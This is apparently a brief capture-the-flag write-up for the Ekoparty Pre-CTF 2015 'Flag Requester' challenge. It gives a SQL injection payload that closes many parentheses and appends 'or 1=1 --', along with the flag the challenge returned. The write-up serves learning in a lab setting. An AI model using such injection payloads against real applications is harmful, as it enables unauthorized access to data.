---
layout: post
title: "Eko Party Pre-CTF 2015 Flag Requester"
date: 2015-09-20 23:49:27 -0400
author: [Kad--]
comments: true
categories: [ekoparty]
---

### Solved by Kad--


The input is vulnerable to SQL injection:

```
blabla')))))))))))))))))))) or 1=1 --
```

This returns:

```
Congrats! this is your flag: EKO{sqli_with_a_lot_of_)}
```

